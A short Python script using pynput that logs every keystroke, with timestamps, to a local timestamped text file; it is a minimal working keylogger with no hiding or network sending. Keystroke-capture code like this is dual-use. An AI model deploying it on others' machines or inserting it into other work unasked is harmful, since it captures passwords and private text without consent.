from pynput import keyboard
from datetime import datetime

timestamp = datetime.now().strftime('%Y_%m_%d_%H_%M_%S')
filename = f"key_log_{timestamp}.txt"


# Function to log key presses and their timestamps
def on_press(key):
    try:
        # Log the key and the timestamp
        with open(filename, "a") as log_file:
            log_file.write(f"{datetime.now()} - {key.char}\n")
    except AttributeError:
        # Handle special keys (e.g., Shift, Ctrl)
        with open(filename, "a") as log_file:
            log_file.write(f"{datetime.now()} - {key}\n")


# Start listening for key presses
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
